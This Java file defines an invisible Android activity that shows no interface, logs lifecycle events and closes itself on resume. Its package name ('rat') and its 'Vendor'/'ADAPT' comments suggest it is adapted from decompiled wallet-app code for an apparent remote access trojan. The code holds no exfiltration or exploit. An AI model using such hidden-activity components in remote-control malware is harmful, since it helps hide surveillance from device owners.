package com.vendor.rat.activity;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;

/**
 * Vendor: com.guard.wallet.activity.NoDisplayActivity
 * Transparent activity used to trigger task stack updates without UI.
 */
public class NoDisplayActivity extends Activity {

    public static volatile NoDisplayActivity instance;

    @Override
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setTheme(android.R.style.Theme_NoDisplay);
        instance = this;
        // ADAPT: vendor calls h.I() to notify activity state
        // com.vendor.rat.utils.MiscUtils.notifyActivityState();
    }

    @Override
    public final void onDestroy() {
        Log.d("NoDisplayActivity", "NoDisplayActivity onDestroy:" + Thread.currentThread().getId());
        super.onDestroy();
        if (instance != null) {
            synchronized (NoDisplayActivity.class) {
                instance = null;
            }
        }
    }

    @Override
    public final void onRestoreInstanceState(Bundle bundle) {
        super.onRestoreInstanceState(bundle);
    }

    @Override
    public final void onResume() {
        super.onResume();
        Log.d("NoDisplayActivity", "NoDisplayActivity onResume:" + Thread.currentThread().getId());
        finish();
    }

    @Override
    public final void onStart() {
        super.onStart();
        Log.d("NoDisplayActivity", "NoDisplayActivity onStart:" + Thread.currentThread().getId());
    }

    @Override
    public final void onStop() {
        Log.d("NoDisplayActivity", "NoDisplayActivity onStop:" + Thread.currentThread().getId());
        super.onStop();
    }
}
